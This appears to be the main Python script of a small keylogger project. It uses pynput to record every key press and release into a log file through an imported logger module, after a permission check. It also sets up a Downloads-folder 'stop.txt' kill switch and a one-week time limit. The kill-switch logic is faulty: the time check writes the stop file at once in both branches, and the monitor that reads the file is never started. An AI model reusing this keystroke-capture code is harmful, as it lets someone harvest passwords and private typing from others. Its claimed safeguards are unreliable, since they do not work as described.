import file
import logger
import time
import threading
import os

from tkinter import messagebox
from datetime import datetime
from pynput.keyboard import Key, Listener
# for ignoring ctrl c


def txt_finder():
    home = os.path.expanduser("~")  # Gets C:\Users\YourUsername
    downloads = os.path.join(home, "Downloads")
    return downloads


def write_kill_switch(kill_switch_path) -> str:
    """Write to the kill switch file when the program exits and returns the path to the file."""
    # makes the file name
    fileName = "stop.txt"
    # combiens the paths
    kill_switch_path = os.path.join(kill_switch_path, fileName)
    # opens the file and writes to it
    with open(kill_switch_path, "a") as f:
        f.write(f"Program exited at: {datetime.now()}\n")
        return kill_switch_path


def monitor_kill_switch(kill_switch_path):
    """Continuously check for the kill switch file."""

    while True:
        if os.path.exists(kill_switch_path):
            print("Kill switch activated.")
            messagebox.showinfo("The program has been stopped")
            with open(kill_switch_path, "a") as f:
                f.write(f"Program stopped at: {datetime.now()}\n")
            os._exit(0)  # Force kill whole program
        time.sleep(1)


def monitor_time(current_date, future_date):
    """Monitor the time and date of the file. If a week has passed, it will stop the program."""
    now = current_date
    if now >= future_date:
        print("Time limit reached. Exiting program.")

        # Will call the function to get downloads folder

        # call the function to make the stop.txt file in downloads folder

        # will then call function to check if it exists, then write to it
        write_kill_switch(txt_finder())

    # the else will handle the situation if the program is closed before the future date
    else:
        write_kill_switch(txt_finder())


def main():
    ans = file.kernel_permission()
    if not ans:
        print("Permission denied. Exiting program.")

    else:
        log_file_path = file.file_make_and_write()

        # Start kill switch monitor in a separate thread
        threading.Thread(
            target=monitor_time,
            args=(log_file_path[1][0], log_file_path[1][1]),
            daemon=True,
        ).start()

        # Start keylogger
        print("Keylogger running.")
        with Listener(
            on_press=lambda key: logger.on_press_func(key, log_file_path[0]),
            on_release=lambda key: logger.on_release_func(key, log_file_path[0]),
        ) as listener:
            listener.join()


main()
